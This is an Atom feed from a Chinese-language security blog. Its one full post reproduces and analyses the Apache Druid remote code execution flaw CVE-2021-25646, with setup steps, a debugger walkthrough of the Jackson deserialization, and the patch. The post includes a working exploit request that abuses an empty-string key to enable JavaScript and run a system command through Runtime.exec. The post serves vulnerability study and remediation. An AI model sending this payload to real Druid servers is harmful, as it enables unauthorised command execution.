<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Home</title>
  
  
  <link href="https://pety404.github.io/atom.xml" rel="self"/>
  
  <link href="https://pety404.github.io/"/>
  <updated>2022-05-19T03:56:15.288Z</updated>
  <id>https://pety404.github.io/</id>
  
  <author>
    <name>pety</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Apache Druid命令执行漏洞(CVE-2021-25646)</title>
    <link href="https://pety404.github.io/2022/05/19/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/"/>
    <id>https://pety404.github.io/2022/05/19/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/</id>
    <published>2022-05-19T03:30:35.000Z</published>
    <updated>2022-05-19T03:56:15.288Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>Apache Druid是JAVA编写的高性能实时分析型数据库，在即时数据可见性、运营分析以及高并发等方面表现非常出色。Apache Druid能够执行嵌入在各种类型的请求中的用户提供的JavaScript代码，默认情况下该功能是禁用的。但在Druid 0.20.0及之前的版本中，不管该功能是否启用，经过认证的用户可以发送恶意请求来使Druid强制运行该请求中的JavaScript代码，成功在目标系统上执行代码。</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p><strong>影响版本</strong>：Apache Druid &lt; 0.20.1</p><p>本次复现采用Apache Druid 0.19.0</p><p><code>wget https://archive.apache.org/dist/druid/0.19.0/apache-druid-0.19.0-bin.tar.gztar -xzvf apache-druid-0.19.0-bin.tar.gzcd apache-druid-0.19.0./bin/start-micro-quickstart</code></p><p>启动后服务绑定在8888端口,默认没有授权认证</p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps29.jpg" alt="img"> </p><p>点击load data,抓到以下数据包，放入新建文件exp，进入部署目录发现文件新建成功。</p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps30.jpg" alt="img"> </p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/image-20220519115441576.png" alt="image-20220519115441576"></p><p><code>&#123;&quot;type&quot;: &quot;index&quot;, &quot;spec&quot;: &#123;&quot;ioConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;, &quot;inputSource&quot;: &#123;&quot;type&quot;: &quot;inline&quot;, &quot;data&quot;: &quot;&#123;\&quot;isRobot\&quot;:true,\&quot;channel\&quot;:\&quot;#x\&quot;,\&quot;timestamp\&quot;:\&quot;2020-12-12T12:10:21.040Z\&quot;,\&quot;flags\&quot;:\&quot;x\&quot;,\&quot;isUnpatrolled\&quot;:false,\&quot;page\&quot;:\&quot;1\&quot;,\&quot;diffUrl\&quot;:\&quot;https://xxx.com\&quot;,\&quot;added\&quot;:1,\&quot;comment\&quot;:\&quot;Botskapande Indonesien omdirigering\&quot;,\&quot;commentLength\&quot;:35,\&quot;isNew\&quot;:true,\&quot;isMinor\&quot;:false,\&quot;delta\&quot;:31,\&quot;isAnonymous\&quot;:true,\&quot;user\&quot;:\&quot;Lsjbot\&quot;,\&quot;deltaBucket\&quot;:0,\&quot;deleted\&quot;:0,\&quot;namespace\&quot;:\&quot;Main\&quot;&#125;&quot;&#125;, &quot;inputFormat&quot;: &#123;&quot;type&quot;: &quot;json&quot;, &quot;keepNullColumns&quot;: true&#125;&#125;, &quot;dataSchema&quot;: &#123;&quot;dataSource&quot;: &quot;sample&quot;, &quot;timestampSpec&quot;: &#123;&quot;column&quot;: &quot;timestamp&quot;, &quot;format&quot;: &quot;iso&quot;&#125;, &quot;dimensionsSpec&quot;: &#123;&#125;, &quot;transformSpec&quot;: &#123;&quot;transforms&quot;: [], &quot;filter&quot;: &#123;&quot;type&quot;: &quot;javascript&quot;, &quot;dimension&quot;: &quot;added&quot;, &quot;function&quot;: &quot;function(value) &#123;java.lang.Runtime.getRuntime().exec(&#39;touch aaa.txt&#39;)&#125;&quot;, &quot;&quot;: &#123;&quot;enabled&quot;: true&#125;&#125;&#125;&#125;, &quot;type&quot;: &quot;index&quot;, &quot;tuningConfig&quot;: &#123;&quot;type&quot;: &quot;index&quot;&#125;&#125;, &quot;samplerConfig&quot;: &#123;&quot;numRows&quot;: 500, &quot;timeoutMs&quot;: 15000&#125;&#125;</code></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>默认情况下，JavaScript是禁用的，但是可以通过设置configuration属性来启用:druid.javascript.enabled &#x3D; true，所以这个漏洞关键点就是如何开启druid.javascript.enabled。</p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps32.jpg" alt="img"> </p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps33.jpg" alt="img"> </p><p>可以看到通过enabled来控制是否开启，那我们只要找到哪些地方可以控制，就可以利用。</p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps34.jpg" alt="img"> </p><p>type 为 javascript 时指定对象为 <code>JavaScriptDimFilter</code> </p><p>@JsonCreator用于在json反序列化时指明调用特定构造方法。</p><p>@JsonProperty用于属性上，作用是把该属性的名称序列化为另外一个名称，比如@JsonProperty(“before”) String after，会将json里key为before的内容解析到after变量上。</p><p>@JacksonInject 当用户没有对应字段时，相应附上默认值。</p><p>即当反序列化JavaScriptDimFilter对象时，JavaScriptDimFilter会调用@JsonCreator注解的构造方法，当注解@JsonCreator修饰方法时，方法的所有参数都会被解析成CreatorProperty类型，如果属性没有被@JsonProperty修饰，就会创建一个name为””的CreatorProperty，Jackson会将用户输入的key为””的value赋值给该属性。</p><p>构造””: { “enabled”: true }去开启javascript enabled。</p><p>下面我们开始跟进一下数据流</p><p>开启 Apache Druid 的 debug 模式，需要设置 Apache Druid 的启动参数，设置文件 <code>apache-druid-0.19.0/conf/druid/single-server/micro-quickstart/coordinator-overlord/jvm.config</code> 在其中添加 java debug 的参数</p><p>-Xdebug -Xnoagent -Djava.compiler&#x3D;NONE -Xrunjdwp:transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;192.168.45.128:5005 </p><p>注意address，网上教程全部是address&#x3D;5005，监听IP是127.0.0.1，但是咱们部署在虚拟机，导致主机IDEA无法连接，所以要加上IP，这块是个坑。</p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps35.jpg" alt="img"> </p><p>-agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;5005</p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps36.jpg" alt="img"> </p><p>Druid用到了jackson反序列化，在pom.xml加上依赖</p><p><dependencies>  <dependency>    <groupId>com.fasterxml.jackson.core</groupId>    <artifactId>jackson-core</artifactId>    <version>2.9.0</version>  </dependency>  <dependency>    <groupId>com.fasterxml.jackson.core</groupId>    <artifactId>jackson-databind</artifactId>    <version>2.9.0</version>  </dependency>  <dependency>    <groupId>com.fasterxml.jackson.core</groupId>    <artifactId>jackson-annotations</artifactId>    <version>2.9.0</version>  </dependency>  </dependencies></p><p>com.fasterxml.jackson.databind.deser.BeanDeserializer#_deserializeUsingPropertyBased解析用户输入，用</p><p>json串中的“键名”去查找当前解析对象中对应的creatorProperty</p><p>遍历json串，取出属性名放到_propertyLookup数组</p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps37.jpg" alt="img"> </p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps38.jpg" alt="img"> </p><p>接下来开始遍历_propertyLookup数组，在</p><p>com.fasterxml.jackson.databind.jsontype.impl.AsPropertyTypeDeserializer#_deserializeTypedForId,根据type获取反序列化类进行参数赋值。</p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps39.jpg" alt="img"> </p><p>调试重复走这几个过程，我们step out快速到transformSpec的处理逻辑，根据type判断是javascript，反序列化javascriptdimfilter类对象，其中javascriptconfig参数因为没有被@JsonProperty修饰，取了键名” ”的值。</p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps40.jpg" alt="img"> </p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/wps41.jpg" alt="img"> </p><p>所以绕过了JavaScriptconfig检查，成功执行js代码，其中js代码支持调用java函数，所以可以调用系统命令。</p><p><img src="/../images/Apache-Druid%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2021-25646/image-20220519115614355.png" alt="image-20220519115614355"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>1.升级到Apache Druid 0.20.1。</p><p>&#x2F;&#x2F;org.apache.druid.guice.GuiceAnnotationIntrospector @Override public JsonIgnoreProperties.Value findPropertyIgnorals(Annotated ac) {  if (ac instanceof AnnotatedParameter) {   final AnnotatedParameter ap &#x3D; (AnnotatedParameter) ac;   if (ap.hasAnnotation(JsonProperty.class)) {    return JsonIgnoreProperties.Value.empty();   }  }   return JsonIgnoreProperties.Value.forIgnoredProperties(“”); }</p><p>当属性被@JsonProperty修饰，则允许为空，如果属性没有被@JsonProperty修饰，则不允许为空。JavaScriptConfig被调用点的参数都没有被@JsonProperty修饰，因此不接受空键值，杜绝了用户输入。</p><p>2.加强访问控制，禁止未授权用户访问web管理页面。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h1&gt;&lt;p&gt;Apache Druid是JAVA编写的高性能实时分析型数据库，在即时数据可见性、运营分析以及高并发等方面表现非常出色。Ap</summary>
      
    
    
    
    <category term="代码审计" scheme="https://pety404.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>freemarker模板注入SSTI</title>
    <link href="https://pety404.github.io/2022/05/17/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5SSTI/"/>
    <id>https://pety404.github.io/2022/05/17/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5SSTI/</id>
    <published>2022-05-17T02:11:00.410Z</published>
    <updated>2022-05-19T03:29:29.059Z</updated>
    
    
    
    
    <category term="代码审计" scheme="https://pety404.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
</feed>
